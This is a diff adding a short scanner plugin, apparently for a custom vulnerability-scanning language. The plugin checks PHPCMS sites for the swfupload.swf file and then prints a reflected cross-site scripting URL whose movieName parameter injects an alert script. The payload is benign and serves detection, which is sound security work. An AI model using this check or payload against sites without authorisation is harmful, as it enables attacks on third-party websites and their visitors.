@@ -1,0 +1,12 @@
+#request url = var
+#define payload = /statics/js/swfupload/swfupload.swf
+#define bug = CWS
+#define info = /statics/js/swfupload/swfupload.swf?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28%22xss%22%29}}// |存在phpcms swfupload.swf反射xss
+function main(args)
+{
+	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[0],bug,0)!= "-1")
+	{
+		print(url.info);
+	}
+}
